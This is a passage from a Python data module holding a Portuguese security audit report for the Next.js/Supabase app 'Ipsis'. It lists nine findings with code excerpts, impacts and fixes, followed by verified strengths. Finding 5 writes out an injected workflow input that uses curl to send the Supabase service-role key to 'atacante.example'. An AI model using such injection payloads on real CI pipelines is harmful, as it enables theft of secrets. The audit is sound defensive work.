# -*- coding: utf-8 -*-
"""
Dados da auditoria de segurança do Ipsis — separados do renderizador.

Cada achado carrega o caminho do arquivo, a(s) linha(s) exata(s), o trecho de
código, por que é explorável, o impacto e a condição de explorabilidade. O
renderizador (`gerar_relatorio.py`) não decide nada sobre conteúdo: ele desenha
o que está aqui.
"""

PROJETO = "Ipsis"
DATA = "02/09/2026"
DATA_CORRECAO = "02/09/2026"
BRANCH = "acesso/bloco-2"
COMMIT = "07edffb"

CORES = {
    "critica": "#B91C1C",
    "alta": "#EA580C",
    "media": "#D97706",
    "baixa": "#2563EB",
    "forte": "#059669",
    "info": "#64748B",
}

ROTULO_SEV = {
    "critica": "Crítica",
    "alta": "Alta",
    "media": "Média",
    "baixa": "Baixa",
    "info": "Informativa",
}


ROTULO_SIT = {
    "resolvido": "Resolvido",
    "parcial": "Resolvido em parte",
    "aberto": "Em aberto",
}

CORES_SIT = {
    "resolvido": "#059669",
    "parcial": "#D97706",
    "aberto": "#B91C1C",
}

STACK = [
    ("Linguagem / runtime", "TypeScript 5.9 sobre Node 22; Python 3.12 nos coletores de lote."),
    ("Framework", "Next.js 15 (App Router), React 19, Server Components e route handlers."),
    ("Persistência", "Supabase (Postgres + pgvector). Sem ORM: PostgREST via supabase-js "
                     "(.from() / .rpc()) em runtime; driver `postgres` em conexão direta só em scripts/."),
    ("Isolamento de inquilino", "Row Level Security no Postgres, ancorada em auth.uid(). Não há "
                                "middleware de tenant nem filtro manual por usuario_id nas queries "
                                "— a RLS É o mecanismo."),
    ("Autenticação", "Supabase Auth (e-mail e senha), sessão em cookie via @supabase/ssr; decisão "
                     "de acesso por getUser() no middleware e no layout de (app)."),
    ("Frontend", "React 19 + Tailwind v4. Nenhum motor de template server-side de HTML."),
    ("Deploy / CI", "Vercel (vercel.json, dois crons) e GitHub Actions (verificacao.yml e "
                    "vigilia.yml). Sem Docker, Helm ou Terraform no repositório."),
]

METODOLOGIA = [
    ("1. Banco sem tranca",
     "O equivalente da stack é a RLS do Postgres. Foram lidas as 23 migrations de "
     "supabase/migrations/, conferindo tabela por tabela se há <b>enable row level security</b>, "
     "quais policies existem e a quais papéis (anon / authenticated) elas se aplicam; e foram "
     "lidas todas as funções SQL em busca de <b>security definer</b> sem search_path fixo ou com "
     "grant amplo demais."),
    ("2. Permissão definida no navegador",
     "O projeto não tem papéis — isAdmin, canEdit e role não existem em src/. A categoria foi "
     "reinterpretada como “gate que o app aplica e o dado não”: cada operação privilegiada foi "
     "cruzada com a autorização equivalente no banco e no middleware."),
    ("3. IDOR",
     "Percorridos os cinco route handlers de src/app/api/, o handler de /auth/confirmar e todas "
     "as chamadas .from() / .rpc() de src/lib/, verificando se cada busca, alteração ou exclusão "
     "por id resolve a posse pelo chamador."),
    ("4. Chaves expostas",
     "Varredura por regex em todo o repositório (código, SQL, YAML, Markdown, CI), nos 160 "
     "commits do histórico do git, no bundle compilado em .next/static/ e nos arquivos de "
     "ambiente; verificação dos defaults de leitura de variável de ambiente nos dois runtimes."),
    ("5. Inputs sem tratamento (XSS)",
     "Busca por dangerouslySetInnerHTML, innerHTML, eval, new Function e srcdoc; auditoria das "
     "14 ocorrências de href dinâmico até a origem do dado; conferência da biblioteca de "
     "saneamento (sanitize-html) e de onde exatamente ela é aplicada."),
]

ESCOPO = [
    "src/ — 101 arquivos TypeScript/TSX: middleware, cinco rotas de API, libs de auth, busca, "
    "consulta, peça, decretos e vigília, e os componentes de tela.",
    "supabase/migrations/ — 23 migrations: schema, RLS, funções de busca, tetos e triggers.",
    "coletores/ e scripts/ — coletores em Python e scripts de lote em TypeScript.",
    ".github/workflows/, vercel.json, next.config.mjs, playwright.config.ts e e2e/.",
    "Histórico do git (160 commits) e bundle compilado em .next/static/.",
]

FORA_DE_ESCOPO = [
    "Configuração do painel do Supabase — política de signup, “Secure password change”, Redirect "
    "URLs. Não vive no repositório e não pôde ser lida.",
    "Estado do banco em produção: as conclusões sobre RLS vêm das migrations, que são a fonte "
    "versionada. Um ALTER POLICY aplicado à mão fora delas não seria visível aqui.",
    "Teste dinâmico de penetração. Todas as afirmações são de leitura de código, salvo a "
    "verificação do regex do middleware e a varredura do bundle compilado, que foram executadas.",
]

# -----------------------------------------------------------------------------
# Achados
# -----------------------------------------------------------------------------
ACHADOS = [
    {
        "id": 1,
        "sev": "alta",
        "cat": "Permissão definida no navegador",
        "titulo": "Cadastro público aberto num produto declaradamente de usuário único",
        "arquivos": [
            "src/lib/auth/rotas.ts:48-67",
            "src/components/auth/cadastro.tsx:62-83",
            "src/lib/auth/mensagens.ts:55",
        ],
        "trecho": (
            "// src/lib/auth/rotas.ts:48\n"
            "const PUBLICAS = [\n"
            "  '/login',\n"
            "  '/cadastro',        // <- registro self-service, sem allowlist de e-mail\n"
            "  '/esqueci-senha',\n"
            "  ...\n"
            "]\n"
            "\n"
            "// src/components/auth/cadastro.tsx:62\n"
            "const { data, error } = await supabaseNavegador().auth.signUp({\n"
            "  email: email.trim(),\n"
            "  password: senha,\n"
            "})\n"
            "// ...\n"
            "if (!data.session) { setAguardandoEmail(true); ... }\n"
            "router.replace(destinoSeguro(proximo))   // sessão pronta, entra direto"
        ),
        "porque": (
            "O modelo de acesso do produto é “usuário único”, afirmado em três lugares: o "
            "CLAUDE.md, o comentário de 0007_conversas.sql e a própria tela de Configurações, que "
            "diz “Usuário único, e-mail e senha. Sem OAuth, sem papéis, sem convite”. Esse modelo "
            "não é imposto em nenhum ponto do servidor: /cadastro está na lista de rotas públicas, "
            "chama signUp() sem allowlist, e o projeto exige que a confirmação de e-mail fique "
            "DESLIGADA no painel do Supabase — o que faz signUp() devolver sessão pronta. Um "
            "visitante anônimo obtém, preenchendo um formulário, uma sessão authenticated válida "
            "que atravessa o middleware."
        ),
        "impacto": (
            "Com sessão authenticated o estranho alcança: (a) POST /api/consulta/aovivo, que gasta "
            "a API da OpenAI e consome o teto mensal ÚNICO de 200 gerações, compartilhado com o "
            "dono; (b) GET /api/peca/[casoId], que gera .docx; (c) UPDATE em "
            "public.vigilia_alteracoes, cuja policy é using (true) — ver achado 6. Os dados "
            "pessoais do dono NÃO vazam: clientes, conversas e perfil têm RLS por auth.uid(), e "
            "isso foi conferido linha a linha."
        ),
        "condicao": (
            "Vale enquanto “Allow new users to sign up” estiver ligado no painel do Supabase — que "
            "é o padrão da plataforma, e o repositório não pede para desligar. O código já traduz "
            "a mensagem signup_disabled (src/lib/auth/mensagens.ts:55), então a possibilidade foi "
            "cogitada e não virou exigência documentada de deploy."
        ),
        "situacao": "parcial",
        "correcao": (
            "Metade em código, metade no painel. Escrito: a exigência de desligar “Allow new users to sign up” entrou em CLAUDE.md e README.md, com o motivo pelo qual remover a tela não resolveria — signUp() sai do navegador direto para o Auth do Supabase, e o app Next nunca vê a requisição. Fechar de fato é um interruptor do painel."
        ),
    },
    {
        "id": 2,
        "sev": "alta",
        "cat": "Permissão definida no navegador",
        "titulo": "consome_uso_llm() é security definer e está concedida a anon — o teto mensal "
                  "pode ser esgotado por qualquer um",
        "arquivos": [
            "supabase/migrations/0010_teto_llm.sql:21-27",
            "supabase/migrations/0010_teto_llm.sql:57-58",
            "src/app/api/consulta/aovivo/route.ts:149",
        ],
        "trecho": (
            "-- supabase/migrations/0010_teto_llm.sql:21\n"
            "create or replace function public.consome_uso_llm()\n"
            "returns table (permitido boolean, chamadas integer, teto integer)\n"
            "language plpgsql\n"
            "security definer                       -- ignora a RLS que fecha uso_llm\n"
            "set search_path = public, pg_temp\n"
            "as $$ ... update public.uso_llm u set chamadas = u.chamadas + 1 ... $$;\n"
            "\n"
            "-- linhas 57-58\n"
            "revoke all on public.uso_llm from anon, authenticated;\n"
            "grant execute on function public.consome_uso_llm() to anon, authenticated;\n"
            "--                                                    ^^^^"
        ),
        "porque": (
            "A rota /api/consulta/aovivo é protegida por sessão e só chama a função depois de "
            "passar pelo middleware. Mas o gate vive apenas na aplicação: no banco a função é "
            "security definer — portanto ignora a RLS que fecha uso_llm — e tem EXECUTE concedido "
            "a anon. A chave publishable necessária para invocá-la é pública por construção, e foi "
            "encontrada em texto claro no bundle compilado, em "
            ".next/static/chunks/app/(app)/consulta/page.js. Um POST direto a "
            "https://<projeto>.supabase.co/rest/v1/rpc/consome_uso_llm com essa chave "
            "incrementa o contador: sem cookie, sem passar pela rota e sem tocar no limite por IP "
            "que vive na memória do processo Node."
        ),
        "impacto": (
            "Duzentas requisições anônimas zeram o teto do mês. A partir daí "
            "/api/consulta/aovivo devolve 429 para o próprio dono e a Consulta cai "
            "permanentemente para a resposta composta até o mês virar. É negação de serviço sobre "
            "a funcionalidade central do produto, ao custo de 200 requisições HTTP e nenhuma "
            "credencial."
        ),
        "condicao": (
            "Nenhuma. Basta ler a chave publishable do bundle público, que é o modo normal de "
            "operação do Supabase no navegador."
        ),
        "situacao": "resolvido",
        "correcao": (
            "Migration 0023 aplicada e conferida no banco: has_function_privilege devolve false para anon e authenticated, true para service_role. A rota passou a pedir a vaga pelo cliente de serviço (lib/servico.ts). As duas metades andam juntas — a migration sozinha derrubaria a geração. Conferido: uso_llm.chamadas subiu nos dois casos de consulta da suíte de navegador."
        ),
    },
    {
        "id": 3,
        "sev": "media",
        "cat": "Banco sem tranca / superfície de custo",
        "titulo": "/api/busca é pública, sem limite algum, e gasta a API da OpenAI a cada "
                  "requisição",
        "arquivos": [
            "src/lib/auth/rotas.ts:55",
            "src/app/api/busca/route.ts:71-83",
            "src/lib/busca/consultar.ts:61-87",
        ],
        "trecho": (
            "// src/lib/auth/rotas.ts:55  — dentro de PUBLICAS\n"
            "  '/api/busca',\n"
            "\n"
            "// src/app/api/busca/route.ts:71\n"
            "export async function GET(req: Request) {\n"
            "  const p = new URL(req.url).searchParams\n"
            "  return responde(p.get('q'), p.get('lei'), p.get('qtd'))  // sem sessão, sem limite\n"
            "}\n"
            "\n"
            "// src/lib/busca/consultar.ts:68 — disparado por toda consulta\n"
            "const r = await fetch('https://api.openai.com/v1/embeddings', {\n"
            "  method: 'POST',\n"
            "  headers: { authorization: `Bearer ${chave}` },\n"
            "  body: JSON.stringify({ model: MODELO_EMBEDDING, input: consulta }),\n"
            "  cache: 'no-store',\n"
            "})"
        ),
        "porque": (
            "A rota está deliberadamente em PUBLICAS, e o motivo escrito no código é legítimo — "
            "ela lê o mesmo corpus que a chave publishable já expõe sob RLS somente-leitura. O que "
            "não acompanhou a decisão foi um freio: /api/consulta/aovivo tem três (sessão, limite "
            "por IP e teto no banco) e /api/busca não tem nenhum. Nem rate limit, nem cache de "
            "embedding, nem cota. Cada GET dispara uma chamada paga à OpenAI com cache: 'no-store', "
            "e a consulta é aceita até 400 caracteres, o que multiplica o custo por token."
        ),
        "impacto": (
            "Custo financeiro sem limite superior, provocável por atacante anônimo, e esgotamento "
            "da cota da conta OpenAI — que é a mesma que alimenta /api/consulta/aovivo e o npm run "
            "embed. Secundariamente, cada requisição consome uma execução de função serverless e "
            "uma RPC do plano gratuito do Supabase."
        ),
        "condicao": (
            "Nenhuma, além de o deploy ter OPENAI_API_KEY configurada. Sem a chave a rota degrada "
            "para busca sem a perna semântica e o custo desaparece."
        ),
        "situacao": "resolvido",
        "correcao": (
            "Migration 0025: teto mensal de 20.000 embeddings em consome_uso_busca(), no mesmo desenho de 0010, mais cache por chaveDeEmbedding na memória do processo. O teto governa a CHAMADA PAGA, não a rota: estourado, embutir() devolve vetor nulo com aviso e a busca segue por rubrica e léxico. Um 429 numa rota pública entregaria ao atacante a negação de serviço que o teto existe para evitar. Conferido: uso_busca.chamadas sobe a cada busca real."
        ),
    },
    {
        "id": 4,
        "sev": "media",
        "cat": "IDOR / autorização",
        "titulo": "Rotas de API não verificam sessão no handler, e o matcher do middleware exclui "
                  "caminhos por extensão",
        "arquivos": [
            "src/middleware.ts:115-121",
            "src/app/api/peca/[casoId]/route.ts:26-38",
            "src/app/(app)/layout.tsx:22-24",
        ],
        "trecho": (
            "// src/middleware.ts:118\n"
            "matcher: [\n"
            "  '/((?!_next/static|_next/image|favicon\\\\.ico|"
            ".*\\\\.(?:svg|png|jpg|jpeg|gif|webp|ico|txt|xml)$).*)',\n"
            "]\n"
            "\n"
            "// src/app/api/peca/[casoId]/route.ts:26 — nenhuma checagem de usuário\n"
            "export async function GET(_req: Request, { params }: ...) {\n"
            "  const { casoId } = await params\n"
            "  const [c, ts] = await Promise.all([leCaso(casoId), tesesComTemplate()])\n"
            "  ...\n"
            "}"
        ),
        "porque": (
            "A autorização das rotas de API vive inteiramente no middleware — os handlers não "
            "chamam usuarioAtual(). As páginas têm uma segunda camada em (app)/layout.tsx, que "
            "repete o redirect; as rotas de API não têm nenhuma. E o matcher pula qualquer caminho "
            "terminado em .txt, .xml, .svg, .png, .jpg, .jpeg, .gif, .webp ou .ico. Verificado "
            "executando o regex do próprio arquivo contra caminhos reais: /api/peca/caso.txt → "
            "MIDDLEWARE PULADO; /api/peca/caso_flagrante → MIDDLEWARE RODA. Numa rota com segmento "
            "dinâmico, quem controla o segmento controla se o porteiro roda."
        ),
        "impacto": (
            "Hoje o impacto é contido, e é justo dizê-lo: os seis ids de caso em "
            "data/curadoria/casos.yaml não terminam em extensão excluída, então /api/peca/x.txt "
            "resolve para 404 e não entrega peça nenhuma; e public.casos tem policy de leitura "
            "pública, portanto o conteúdo não é privado. O risco é estrutural: a próxima rota de "
            "API com segmento dinâmico — ou o próximo id de caso com ponto no nome — nasce sem "
            "porteiro, e nada no repositório avisaria."
        ),
        "condicao": (
            "Explorável hoje apenas para pular o middleware, o que foi confirmado. Para extrair "
            "dado é preciso que exista um recurso cujo id termine numa das extensões excluídas."
        ),
        "situacao": "resolvido",
        "correcao": (
            "Duas mudanças. O matcher ganhou (?!api/) na frente da lista de extensões, e usuarioAtual() passou a ser chamado dentro de /api/consulta/aovivo e /api/peca/[casoId]. Conferido contra next start: /api/peca/<id>.txt, que antes pulava o middleware, agora devolve 307 para /login. tests/acesso.test.ts tranca o regex e confere que ele é literalmente o do arquivo."
        ),
    },
    {
        "id": 5,
        "sev": "media",
        "cat": "Chaves expostas / CI",
        "titulo": "Injeção de comando no workflow da vigília, num job que carrega a service role",
        "arquivos": [
            ".github/workflows/vigilia.yml:49-57",
            ".github/workflows/vigilia.yml:93-111",
        ],
        "trecho": (
            "# .github/workflows/vigilia.yml:49\n"
            "workflow_dispatch:\n"
            "  inputs:\n"
            "    desde:\n"
            "      description: 'Data ISO (padrão: janela de 60 dias). ...'\n"
            "\n"
            "# linha 93\n"
            "- name: coletar\n"
            "  env:\n"
            "    SUPABASE_SERVICE_ROLE_KEY: ${{ secrets.SUPABASE_SERVICE_ROLE_KEY }}\n"
            "    INLABS_SENHA: ${{ secrets.INLABS_SENHA }}\n"
            "  run: |\n"
            "    python -m coletores \\\n"
            "      ${{ inputs.seco && '--seco' || '' }} \\\n"
            "      ${{ inputs.desde && format('--desde {0}', inputs.desde) || '' }}\n"
            "#     ^ interpolado direto no shell, sem quoting e sem validação"
        ),
        "porque": (
            "${{ inputs.desde }} é substituído textualmente no script de shell ANTES da execução. "
            "Um valor como 2025-01-01; curl -d \"$SUPABASE_SERVICE_ROLE_KEY\" "
            "https://atacante.example vira um comando a mais dentro do mesmo passo, com todas as "
            "variáveis de ambiente do job à disposição. A rota HTTP equivalente do projeto, "
            "/api/vigilia/coletar, valida o formato com um regex ISO antes de usar o parâmetro; o "
            "workflow não valida nada."
        ),
        "impacto": (
            "Exfiltração de SUPABASE_SERVICE_ROLE_KEY, que ignora RLS e abre o banco inteiro para "
            "escrita, e de INLABS_EMAIL / INLABS_SENHA. O ganho real é de privilégio: segredos do "
            "GitHub Actions não são legíveis por colaboradores, nem mesmo com permissão de "
            "escrita — este passo os torna legíveis."
        ),
        "condicao": (
            "workflow_dispatch exige permissão de escrita no repositório. O atacante é, portanto, "
            "um colaborador ou uma conta comprometida com write, não um anônimo. Pull request "
            "vindo de fork não dispara workflow_dispatch."
        ),
        "situacao": "resolvido",
        "correcao": (
            "inputs.desde e inputs.seco passaram para env: e são referenciados como variáveis citadas, com validação do formato ISO antes do uso — a mesma regra que a rota HTTP já aplicava. O job ganhou permissions: contents: read. Um defeito foi achado no caminho: ${SECO:+--seco} expandiria também com a caixa desmarcada, porque o booleano chega como o texto “false”."
        ),
    },
    {
        "id": 6,
        "sev": "baixa",
        "cat": "Banco sem tranca",
        "titulo": "A policy marca_reconferido usa using (true): qualquer sessão marca ou "
                  "sobrescreve o carimbo de qualquer linha",
        "arquivos": [
            "supabase/migrations/0012_vigilia.sql:138-145",
            "src/lib/vigilia/marcar.ts:28-31",
        ],
        "trecho": (
            "-- supabase/migrations/0012_vigilia.sql:138\n"
            "grant update (reconferido_em, reconferido_por)\n"
            "  on public.vigilia_alteracoes to authenticated;\n"
            "\n"
            "create policy marca_reconferido on public.vigilia_alteracoes\n"
            "  for update to authenticated\n"
            "  using (true)                                  -- <- alcança toda linha\n"
            "  with check (reconferido_por = (select auth.uid()));"
        ),
        "porque": (
            "using (true) diz que a policy alcança todas as linhas da tabela. O with check só "
            "obriga a assinar com o próprio uid — não impede sobrescrever a marca de outro. Numa "
            "tabela de um usuário só isso é inofensivo por definição; combinado com o achado 1, "
            "qualquer estranho que crie conta passa a poder marcar como “conferido” achados da "
            "vigília que o dono ainda não leu, ou re-carimbar os que ele já leu."
        ),
        "impacto": (
            "Corrupção do estado de trabalho da vigília: achado marcado como conferido deixa de "
            "pedir atenção na tela /fontes. Como a vigília existe para avisar que a data de corte "
            "envelheceu, silenciar um achado tem consequência jurídica indireta. O grant por "
            "COLUNA limita bem o dano — ementa, url e leis_tocadas continuam inalteráveis, e isso "
            "é acerto de projeto."
        ),
        "condicao": "Exige sessão authenticated. Ver o achado 1 para como obtê-la.",
        "situacao": "resolvido",
        "correcao": (
            "Migration 0024 aplicada. A policy passou a using (reconferido_por is null or reconferido_por = auth.uid()): marcar continua livre, re-marcar o que é de outro, não. Conferido no banco, lendo pg_policies. O grant por coluna de 0012 não foi tocado."
        ),
    },
    {
        "id": 7,
        "sev": "baixa",
        "cat": "Autenticação",
        "titulo": "Troca de senha não exige a senha atual, e a tela é alcançável com sessão comum",
        "arquivos": [
            "src/components/auth/redefinir-senha.tsx:53-62",
            "src/lib/auth/rotas.ts:25",
            "src/lib/auth/rotas.ts:56",
        ],
        "trecho": (
            "// src/lib/auth/rotas.ts:25 — /redefinir-senha fica FORA dos formulários de auth,\n"
            "// então quem tem sessão não é desviado dela\n"
            "export const ROTAS_DE_FORMULARIO = ['/login', '/cadastro', '/esqueci-senha'] as const\n"
            "\n"
            "// src/components/auth/redefinir-senha.tsx:53\n"
            "const supabase = supabaseNavegador()\n"
            "const { error } = await supabase.auth.updateUser({ password: senha })\n"
            "//                                    ^ nenhuma senha atual é pedida"
        ),
        "porque": (
            "O comentário do arquivo afirma que updateUser({ password }) só existe para quem tem "
            "sessão válida, e que é isso que impede a URL da tela, sozinha, trocar a senha de "
            "alguém. A afirmação está certa e é insuficiente: a sessão de recuperação e a sessão "
            "comum de trabalho são a mesma coisa para o Supabase. Como /redefinir-senha é pública "
            "e foi deliberadamente deixada fora de ROTAS_DE_FORMULARIO, um usuário já logado abre "
            "a tela e troca a senha sem provar que conhece a antiga."
        ),
        "impacto": (
            "Um cookie de sessão obtido por outro caminho — aparelho compartilhado, sessão "
            "esquecida aberta, um XSS futuro — vira tomada permanente da conta: o atacante define "
            "senha nova e o dono perde o acesso. Sem exigir a senha atual, a janela entre "
            "“emprestou a tela” e “perdeu a conta” é de dois campos de formulário."
        ),
        "condicao": (
            "Mitigável inteiramente fora do código: o Supabase tem a opção “Secure password "
            "change”, que exige login recente para updateUser({ password }). Ela não é mencionada "
            "em nenhum documento do repositório, e por isso o estado padrão é o descrito acima."
        ),
        "situacao": "parcial",
        "correcao": (
            "Metade em código: /auth/confirmar passou a marcar a sessão nascida de link de recuperação com um cookie httpOnly de 15 minutos, e /redefinir-senha exige essa marca além da sessão. Conferido no navegador: com sessão comum a tela recusa. A outra metade é “Secure password change” no painel — o código resolve o acidente, o painel resolve quem tem um cookie válido e chama o SDK sem passar por tela nenhuma."
        ),
    },
    {
        "id": 8,
        "sev": "baixa",
        "cat": "Inputs sem tratamento (XSS)",
        "titulo": "Nenhum cabeçalho de segurança é emitido — sem CSP e sem frame-ancestors",
        "arquivos": ["next.config.mjs:1-21", "vercel.json:1-13"],
        "trecho": (
            "// next.config.mjs — o arquivo inteiro; não há `async headers()`\n"
            "const nextConfig = {\n"
            "  typescript: { ignoreBuildErrors: false },\n"
            "  eslint: { ignoreDuringBuilds: false },\n"
            "  outputFileTracingIncludes: { ... },\n"
            "}\n"
            "export default nextConfig\n"
            "\n"
            "// vercel.json — só `crons`, nenhum bloco `headers`"
        ),
        "porque": (
            "Verificado por busca em next.config.mjs, vercel.json e src/: não existe "
            "Content-Security-Policy, X-Frame-Options, Referrer-Policy nem "
            "X-Content-Type-Options. A ausência de CSP pesa mais aqui do que num app comum porque "
            "existe um dangerouslySetInnerHTML em produção, em "
            "src/app/(app)/vademecum/[leiId]/page.tsx:117 — o saneamento em build é sólido, mas "
            "CSP é justamente a camada que sobra quando o saneamento falha. A ausência de "
            "frame-ancestors permite emoldurar a aplicação inteira em página de terceiro."
        ),
        "impacto": (
            "Defesa em profundidade ausente: qualquer falha futura de saneamento vira execução de "
            "script sem obstáculo, e o produto pode ser emoldurado para clickjacking sobre ações "
            "destrutivas — apagar cliente em /clientes, encerrar sessões em /configuracoes."
        ),
        "condicao": "Não é explorável por si só: é a ausência de uma camada, não um furo.",
        "situacao": "resolvido",
        "correcao": (
            "Quatro cabeçalhos estáticos em next.config.mjs e CSP com nonce no middleware, carimbada em todas as cinco saídas do arquivo. Conferido contra next start: nonce diferente a cada requisição, 24/24 asserções de navegador passando e as onze telas carregadas com zero violação de CSP e zero erro de console, com as duas fontes do design system carregando."
        ),
    },
    {
        "id": 9,
        "sev": "baixa",
        "cat": "Permissão definida no navegador",
        "titulo": "O limite por IP da rota de geração confia num cabeçalho que o cliente escreve",
        "arquivos": ["src/app/api/consulta/aovivo/route.ts:138-145"],
        "trecho": (
            "// src/app/api/consulta/aovivo/route.ts:138\n"
            "const ip =\n"
            "  req.headers.get('x-forwarded-for')?.split(',')[0]?.trim() ||\n"
            "  req.headers.get('x-real-ip') ||\n"
            "  'desconhecido'\n"
            "\n"
            "if (excedeu(ip)) {\n"
            "  return NextResponse.json({ erro: 'muitas gerações seguidas ...' }, { status: 429 })\n"
            "}"
        ),
        "porque": (
            "x-forwarded-for é uma lista construída por proxies, e tomar o elemento mais à "
            "ESQUERDA é tomar o valor que o cliente pôde escrever. Basta variar o cabeçalho a cada "
            "requisição para que cada uma caia numa chave diferente do Map e o contador nunca "
            "chegue a cinco. O código descreve honestamente o mecanismo como “quebra-molas, não "
            "portão” — o que este achado registra é que o quebra-molas também não segura."
        ),
        "impacto": (
            "Remove o único freio que sobra entre uma sessão válida e a chamada paga ao modelo, "
            "deixando o teto mensal como defesa única — e o teto é justamente o que o achado 2 "
            "mostra ser esgotável de fora."
        ),
        "condicao": (
            "Depende do deploy. Atrás do proxy da Vercel o cabeçalho costuma ser reescrito pela "
            "plataforma, o que anula a manobra; num deploy self-hosted, ou atrás de proxy que "
            "apenas concatena, ela funciona. A lógica no código é insegura nos dois casos."
        ),
        "situacao": "resolvido",
        "correcao": (
            "A chave do limite deixou de ser o elemento mais à esquerda de x-forwarded-for e passou a ser auth.uid(), que vem de um JWT assinado pelo servidor de Auth. Só foi possível porque a rota passou a exigir sessão no handler — os achados 4 e 9 são a mesma mudança."
        ),
    },
]

# -----------------------------------------------------------------------------
# Pontos fortes verificados
# -----------------------------------------------------------------------------
FORTES = [
    ("RLS presente em 100% das tabelas, inclusive nas criadas depois da migration de RLS",
     "Conferidas as 23 migrations uma a uma: leis, artigos, dispositivos, rubricas, "
     "rubrica_dispositivos, teses, casos, argumentacao e uso_llm (0004:11-19); conversas e "
     "conversa_trocas (0007:65-66); perfil (0008:40); clientes (0009:63); uso_llm de novo "
     "(0010:55); vigilia_coletas e vigilia_alteracoes (0012:124-125); vigilia_jurimetria "
     "(0013:50); precedentes_stj (0014:88); decretos_pr e decretos_pr_blocos (0018:148-149). "
     "Nenhuma tabela do schema public ficou sem enable row level security."),

    ("As três tabelas de dado do usuário são isoladas por auth.uid(), e o isolamento cobre "
     "leitura e escrita",
     "conversas (0007:69-73), perfil (0008:43-47) e clientes (0009:66-70) usam for all to "
     "authenticated using (usuario_id = (select auth.uid())) with check (...). conversa_trocas "
     "(0007:79-93) não duplica o dono: resolve pela conversa, com exists. É exatamente o "
     "mecanismo de isolamento que a stack pede, e ele está completo."),

    ("Nenhum IDOR nas operações por id — a RLS resolve a posse que o código não filtra",
     "src/lib/toga/clientes.ts:251 (.eq('id', id) no update) e :266 (no delete) não filtram por "
     "usuario_id, e não precisam: a policy for all de 0009 alcança UPDATE e DELETE, então id de "
     "outro dono não casa linha nenhuma. O mesmo em src/lib/toga/historico.ts:135, 183, 206 e "
     "334. Conferido handler por handler nas cinco rotas de API: /api/health e /api/busca não "
     "recebem id; /api/peca/[casoId] lê casos, que é curadoria de demonstração com leitura "
     "pública por projeto; /api/vigilia/coletar não recebe id; /auth/confirmar troca um código de "
     "uso único emitido pelo servidor de Auth."),

    ("Decisão de acesso sempre por getUser(), nunca por getSession()",
     "src/middleware.ts:77 e src/lib/auth/servidor.ts:46. getSession() lê o cookie sem validar "
     "assinatura; getUser() valida o JWT no servidor de Auth. A escolha certa está feita nos dois "
     "pontos em que a decisão é tomada, e o motivo está escrito no código."),

    ("Proteção de rota por exclusão, com rede de segurança nas páginas",
     "src/lib/auth/rotas.ts:69-71 lista o que é público e o matcher do middleware cobre o resto; "
     "src/app/(app)/layout.tsx:22-24 repete o redirect caso o matcher deixe de casar uma rota "
     "nova. Rota de página nova nasce fechada duas vezes. A ausência dessa segunda camada nas "
     "rotas de API é o achado 4."),

    ("Open redirect fechado no destino pós-login",
     "src/lib/auth/rotas.ts:86-95: destinoSeguro() recusa o que não começa com / e o que começa "
     "com // — URL protocolo-relativa, que o navegador trata como absoluta. Usado nos três "
     "pontos que redirecionam a partir de entrada do usuário: middleware.ts:108, "
     "auth/confirmar/route.ts:27 e cadastro.tsx:82."),

    ("A service role está isolada num único arquivo, inalcançável pelo bundle",
     "src/lib/vigilia/escrita.ts:38-45 é o único ponto de src/ que lê SUPABASE_SERVICE_ROLE_KEY, "
     "e a variável não tem prefixo NEXT_PUBLIC_ — o Next só substitui no bundle o que tem o "
     "prefixo, então um import a partir de componente 'use client' quebra o build em vez de vazar "
     "a chave. src/lib/auth/ambiente.ts:20-24 lê as duas variáveis públicas de forma literal, o "
     "que impede acesso indexado passar despercebido."),

    ("Nenhum segredo no código, no histórico do git ou no bundle compilado",
     "Varredura por regex (sb_secret_, sk-, eyJ…, service_role, password=, senha=) em todo o "
     "repositório: só ocorrências dentro de .venv/, em bibliotecas de terceiros. Nos 160 commits "
     "do histórico, nenhum arquivo .env, .pem, .key ou credencial jamais foi adicionado — só "
     ".env.example, que traz apenas placeholders. No bundle compilado, as únicas ocorrências dos "
     "termos sensíveis são comentários e código da biblioteca do Supabase; a única chave presente "
     "é a publishable, pública por construção. e2e/.sessao.json, que guarda um cookie de sessão "
     "válido, está no .gitignore:77 e nunca foi versionado."),

    ("Nenhum default inseguro em leitura de variável de ambiente",
     "src/lib/supabase.ts:15-19 e src/lib/auth/ambiente.ts:15-18 lançam quando a variável falta, "
     "em vez de cair num valor. coletores/banco.py:55-56 e coletores/inlabs.py:80-81 usam default "
     "vazio, nunca um valor plausível. /api/vigilia/coletar recusa tudo com 503 quando "
     "CRON_SECRET não está configurada (route.ts:37-43) — falha fechada, não aberta."),

    ("O único dangerouslySetInnerHTML do produto recebe HTML saneado em build por allowlist",
     "src/app/(app)/vademecum/[leiId]/page.tsx:117 renderiza HTML que scripts/vademecum.ts:360 "
     "produziu com sanitize-html sob a allowlist de :77-109: tags de documento apenas, style "
     "deliberadamente fora, allowedSchemes limitado a http/https/mailto — o que exclui "
     "javascript: — e script, style, iframe e noscript tratados como nonTextTags. O saneamento "
     "roda uma vez, em build, e o arquivo resultante é versionado e revisável em diff."),

    ("Zero eval, new Function, innerHTML ou srcdoc em src/",
     "Busca em todo src/, e2e/ e scripts/: as únicas ocorrências de dangerouslySetInnerHTML são a "
     "linha citada acima e dois comentários que a explicam. Toda prosa gerada pelo modelo é "
     "renderizada como filho de JSX (src/components/toga/consulta.tsx:911, 1182 e 1925), portanto "
     "escapada pelo React."),

    ("Todos os href dinâmicos resolvem para origens fixas, montadas por template",
     "Auditadas as 14 ocorrências de href={…}. As externas são: doutrina.ts:85 (origem fixa mais "
     "encodeURIComponent), senado.ts:80 e camara.ts:125 (template com id numérico), dou.py:105 "
     "(f-string sobre uma base fixa) e parana.py:424 (idem). Nenhuma pode trocar o esquema para "
     "javascript:. As internas passam por encodeURIComponent onde recebem texto do usuário — "
     "jurisprudencia.tsx:359 e casca.tsx:540."),

    ("Path traversal fechado na única leitura de arquivo por parâmetro de URL",
     "src/lib/vademecum.ts:52-55: textoDoAcervo() confere o id contra o índice antes de "
     "concatená-lo no caminho, e devolve null quando não encontra. É o ponto exato onde um ../ "
     "entraria, e ele está tampado."),

    ("Nenhuma injeção de SQL, e nenhuma injeção de filtro do PostgREST",
     "Todas as chamadas ao banco são parametrizadas: .rpc('busca_hibrida', {…}) em "
     "consultar.ts:252, .rpc('busca_decretos', {…}) em decretos/leitura.ts:171, e .in() / .eq() "
     "nas demais. Os dois pontos que montam filtro com texto do usuário removem os curingas "
     "antes: clientes.ts:184 e historico.ts:247, com o motivo medido contra o banco escrito no "
